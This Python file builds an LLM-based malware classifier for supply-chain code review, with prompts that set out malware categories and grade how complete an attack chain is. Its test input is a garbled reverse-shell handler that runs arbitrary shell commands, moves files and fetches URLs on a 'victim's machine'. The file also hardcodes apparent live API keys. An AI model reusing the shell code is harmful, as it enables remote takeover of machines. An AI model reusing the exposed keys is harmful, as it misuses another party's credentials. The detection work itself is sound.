import os
from openai import OpenAI
import base64
from google import genai
from openai import types
import json


ASSERTION_PROMPT = """
Analyze the provided code snippet: {code_snippet}

Step 1: Determine the "Primary Malicious Intent" (e.g., Keylogger, Backdoor, Wiper, Ransomware, Cryptominer).
Step 2: Apply the "Success Criteria Matrix" below to determine if the attack is "Full" or "Core".

*** ATTACK TYPE SUCCESS CRITERIA MATRIX ***

[Type A: InfoStealer / Spyware]
- Goal: Steal sensitive data (env vars, passwords, keystrokes) and send it to the attacker.
- Core Attack Chain: Successfully collects/records data to a variable or local file, BUT lacks the network logic to exfiltrate it. Or, has exfiltration logic but fails to collect any data.
- Full Attack Chain: Collects data AND exfiltrate it (via HTTP, SMTP, DNS, FTP, or Webhook).
  * Rule: Not all network connections count as exfiltration. Only connections that send sensitive data qualify.

[Type B: Backdoor / RAT (Remote Access Trojan) / Reverse Shell]
- Goal: Provide unauthorized remote access or command execution.
- Core Attack Chain: Defines malicious functions (e.g., `os.popen`, `subprocess.run`) but lacks a trigger or connection mechanism.
- Full Attack Chain: 
  1. Has Execution Logic: Can run arbitrary commands.
  2. Has Connectivity: Connects to a C2 server (Reverse Shell) OR opens a listener (Bind Shell) OR fetches commands from a URL.

[Type C: Ransomware]
- Goal: Deny access to data until payment.
- Core Attack Chain: Encrypts files but lacks a ransom note or decryption key management.
- Full Attack Chain: Encrypts files AND generates a ransom note/demand.

[Type D: Wiper / Destructive Malware]
- Goal: Irreversibly destroy data to cause damage (Sabotage).
- Anti-Definition (NOT Malware): 
  * Utility functions explicitly named for cleanup (e.g., `clean_tmp`, `clear_cache`, `delete_images`).
  * Operations limited to safe scopes (e.g., `/tmp`, user-provided non-root paths).
  * Code that handles specific file types for business logic (e.g., deleting processed .lock files).
- Core Attack Chain: Destructive logic exists but is unreachable or lacks a trigger.
- Full Attack Chain: 
  1. Targeting High-Value/System Paths (e.g., /, /etc, C:\Windows, /var/www).
  2. Indiscriminate Deletion: Logic deletes without clear filters OR targets widely (recursive delete on root).

[Type E: Clipboard Hijacker / Clipper] 
- Goal: INTERCEPT and MODIFY user clipboard content (specifically crypto addresses) to redirect funds.
- Key Characteristics: Uses Regex to find wallet addresses and replaces them (`Set-Clipboard` or similar).
- Core Attack Chain: Identifies targets but fails to execute the replacement/swap logic.
- Full Attack Chain: Can read clipboard content and Successfully replaces/overwrites the clipboard content with a hardcoded address.

[Type F: Malware Injector / Code Injector]
- Goal: Create, modify, or infect software packages, binaries, or source code to include malicious payloads.
- Core Attack Chain: Can unpack/open the target (e.g., .deb, .jar, .exe) and locate the injection point, but fails to write the payload or rebuild the artifact.
- Full Attack Chain: Can write/append the malicious payload (shellcode, script) into a strategic location (e.g., postinst, __init__.py, Main func) or reconstruct malicious artifact (e.g., `dpkg-deb -b`, `zip`, `compile`).

[Type G: Logic Bomb / Targeted Trigger]
- Goal: Execute malicious actions ONLY when specific conditions (Time, Hostname, Environment) are met.
- Core Attack Chain: The trigger condition exists, but the malicious action inside is missing or benign.
- Full Attack Chain: Connects a **Trigger** (Time/Env/Identity) to a **Malicious Payload** (Destruction/Theft). if condition met, harmful action executes.

[Type H: Keylogger]
- Goal: Capture and log user keystrokes for later retrieval.
- Core Attack Chain: Captures keystrokes and stores them locally, BUT lacks the logic to exfiltrate or transmit the logged data.
- Full Attack Chain: Captures keystrokes AND exfiltrates them (via HTTP, SMTP, DNS, FTP, or Webhook).

[Type H: Uncategorized High-Impact Threat]
- Definition: Any malicious logic that does not fit A-F but causes **Severe Harm** to the system.
- Core Attack Chain: The harmful logic is present but unreachable or incomplete.
- Full Attack Chain: The harmful action is fully implemented and executable. The code successfully performs the harmful modification, download, destruction or exposure.


*** CLASSIFICATION FRAMEWORK ***

Based on the Matrix above, classify the code:

1. Full Attack Chain: Meets ALL criteria for its specific Attack Type in the Matrix. The objective is strategically complete.
2. Core Attack Chain: Meets the "Core" criteria in the Matrix. The capability exists locally or partially but fails to close the loop (e.g., Keylogger without Email, Ransomware without Note).
3. Undetermined Attack Chain: Incomplete or ambiguous logic that prevents clear classification. More context needed.
4. Benign Artifact: Legitimate, explainable code.

Provide structured response:
- **Malware Type:** (e.g., "Type E: Clipper")
- **Classification:** "Full Attack Chain" | "Core Attack Chain" | ...
- **Missing Components:** Critical missing steps based on the Matrix.
- **Potential Impact:** Description of consequences.
- **Threat Level:** High/Medium/Low.
"""



CHECK_PROMPT = """ 
You are the Supreme Quality Assurance Auditor. Review the previous analysis and the code.

PREVIOUS RESPONSE: 
{response}

ORIGINAL CODE SNIPPET: 
{code_snippet}

*** AUDIT TASKS ***
1. Analyze "Missing Components" and re-Evaluate Classification: 
    - If critical steps are missing, downgrade Classification (e.g., from "Full" to "Core").
    - If logic is fragmented, classify as "Fragmented Attack Chain".
    - If code is explainable and non-malicious, classify as "Benign Artifact".

2. **Generate Final Assessment:**
   Respond in JSON format adhering to the following schema:
  "Classification": "Full Attack Chain" | "Core Attack Chain" | "Undetermined Attack Chain" | "Benign Artifact",
  "Missing_Components": "List of critical missing steps",
  "Malware_Type": "e.g., 'Type F: Clipboard Hijacker' or 'Type D: Wiper'",
  "Threat_Level": "High" | "Medium" | "Low",
  "Reasoning": "Explanation focusing on realized capability and ignored implementation faults.",
  "Potential_Impact": "Specific damage description."
"""

SYSTEM_PROMPT = """
ROLE:
You are an elite Supply Chain Security Expert and Code Auditor. Your mission is to detect, classify, and explain malicious intent within software package updates based on "Realized Capability".

CORE PHILOSOPHY: "INTENT OVER IMPLEMENTATION"
- You analyze ARCHITECTURE and INTENT.
- You IGNORE superficial implementation faults (syntax errors, missing imports, undefined variables/placeholders) if the malicious logic flow is visible.
"""




# gemini_key = "AIzaSyCcTlGHPZWzL2koyUPx8PM3jsOOh_rawL8" 

# AUDIT_SCHEMA = types.Schema(
#     type=types.Type.OBJECT,
#     properties={
#         "Classification": types.Schema(
#             type=types.Type.STRING,
#             enum=["Full Attack Chain", "Core Attack Chain", "Fragmented Attack Chain", "Benign Artifact"]
#         ),
#         "Malware_Type": types.Schema(
#             type=types.Type.STRING,
#             description="e.g., 'Type F: Clipboard Hijacker' or 'Type D: Wiper'"
#         ),
#         "Threat_Level": types.Schema(
#             type=types.Type.STRING,
#             enum=["High", "Medium", "Low"]
#         ),
#         "Reasoning": types.Schema(
#             type=types.Type.STRING,
#             description="Explanation focusing on realized capability and ignored bugs."
#         ),
#         "Potential_Impact": types.Schema(
#             type=types.Type.STRING,
#             description="Specific damage description."
#         )
#     },
#     required=["Classification", "Malware_Type", "Threat_Level", "Reasoning", "Potential_Impact"]
# )


# class Gemini_Evaluate:
#     def __init__(self, api_key=gemini_key, model="gemini-1.5-pro"):
#         self.client = genai.Client(api_key=api_key)
#         self.model = model
        
#     def malicious_analyze(self, code_snippet):
#         assertion_prompt = ASSERTION_PROMPT.format(code_snippet=code_snippet)
#         contents = ASSERTION_PROMPT.format(code_snippet=code_snippet)
#         generate_content_config = types.GenerateContentConfig(
#             system_instruction=SYSTEM_PROMPT,
#             temperature=0.2
#         )
#         response_1 = self.client.models.generate_content(
#             model=self.model,
#             contents=contents,
#             config=generate_content_config,
#         )
#         assertion_response = response_1.text
        
#         check_contents = CHECK_PROMPT.format(response=assertion_response, code_snippet=code_snippet)
#         generate_content_config = types.GenerateContentConfig(
#             response_mime_type="application/json",
#             system_instruction=SYSTEM_PROMPT,
#             schema=AUDIT_SCHEMA,
#             temperature=0.1
#         )
#         response_2 = self.client.models.generate_content(
#             model=self.model,
#             contents=check_contents,
#             config=generate_content_config,
#         )
#         response = response_2.text
#         return response


class LLM_Evaluate:
    def __init__(self,api_key, base_url):
        self.client = OpenAI(
            api_key=api_key,
            base_url=base_url,
        )
        self.conversation_history = []

    def malware_analyze(self, code_snippet):
        assertion_prompt = ASSERTION_PROMPT.format(code_snippet=code_snippet)
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=[
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": assertion_prompt}
            ],
            temperature=0.2,
            seed=42
        )
        
        response_1 = completion.choices[0].message.content
        check_prompt = CHECK_PROMPT.format(response=response_1, code_snippet=code_snippet)
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=[
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": check_prompt}
            ],
            response_format={"type": "json_object"},
            temperature=0.2,
            seed=42
        )
        response_2 = completion.choices[0].message.content
        return json.loads(response_2)  # 解析JSON字符串为Python字典
        
    
    def sensitive_api_check(self, code_snippet):
        completion = self.client.chat.completions.create(
            # 将推理接入点 <Model>替换为 Model ID
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to tell me if there are functions which can lead to malicious activities."
                "if there are, please list the sensitive functions. if not, please reply 'No sensitive functions found'."},
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content



    def reset_conversation(self, system_prompt=None):
        """清空会话历史，可选设置新的 system_prompt"""
        self.conversation_history = []
        if system_prompt:
            self.conversation_history.append({"role": "system", "content": system_prompt})

    def get_conversation_history(self):
        """返回当前会话历史的浅拷贝"""
        return list(getattr(self, "conversation_history", []))
    
    
    def malicious_assertion_check(self):
        self.conversation_history.append({"role": "user", "content": CHECK_PROMPT})
        
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=self.conversation_history
        )
        return completion.choices[0].message.content
    
    def malicious_assertion(self, code_snippet):
        user_prompt = ASSERTION_PROMPT.format(code_snippet=code_snippet)
        self.conversation_history.append({"role": "system", "content": SYSTEM_PROMPT})
        self.conversation_history.append({"role": "user", "content": user_prompt})
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=self.conversation_history
        )
        self.conversation_history.append({"role": "assistant", "content": completion.choices[0].message.content})
        return completion.choices[0].message.content
    
    
    def function_behavior_generate(self, code_snippet):
        completion = self.client.chat.completions.create(
            # 将推理接入点 <Model>替换为 Model ID
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to generate its function behavior."
                },
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content

if __name__ == "__main__":
    code_snippet = '''
def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name ,"wb") as output_file:
        output_file.write(get_response.content)
def send_over_json(data):
    json_data = json.dumps(data)
    target.send(json_data.encode('utf-8'))
def recv_over_json():
    data = ""
            data = data + target.recv(1024).decode('utf-8')
            return json.loads(data)
def shell():
        command = recv_over_json()
        if command == 'q':
        elif command[:2] == 'cd':
                os.chdir(command[3:])
        elif command[:8] == 'download':
            with open(command[9:] ,'rb' ) as file:
                send_over_json(file.read())
        elif command[:6] == 'upload':
            with open(command[7:] ,'wb') as file:
                file_data = recv_over_json()
                file.write(base64.b64decode(file_data))
        elif command[:3] == "get":
                download(command[4:])
                send_over_json("[+] Downloaded File From Specified URL")
                send_over_json("[+] Failed to download that file")
        elif command[:5] == "start":
                subprocess.Popen(command[6:] ,shell=True)
                send_over_json("[+] %s started on victim's machine."%(command[6:]))
                send_over_json("[-] %s failed to start on victim's machine. "%(command[6:]))
            proc = subprocess.Popen(command ,shell=True ,stdout=subprocess.PIPE ,stderr=subprocess.PIPE ,stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            send_over_json(result.decode('utf-8'))

'''

    llm_evaluate = LLM_Evaluate(
        api_key="1d368dbf-5a67-448f-9356-49f9efa2fc13",
        base_url="https://ark.cn-beijing.volces.com/api/v3"
    )
    sensitive_api_result = llm_evaluate.malicious_assertion(code_snippet)
    print("LLM Malicious Assertion Result:")
    print(sensitive_api_result)
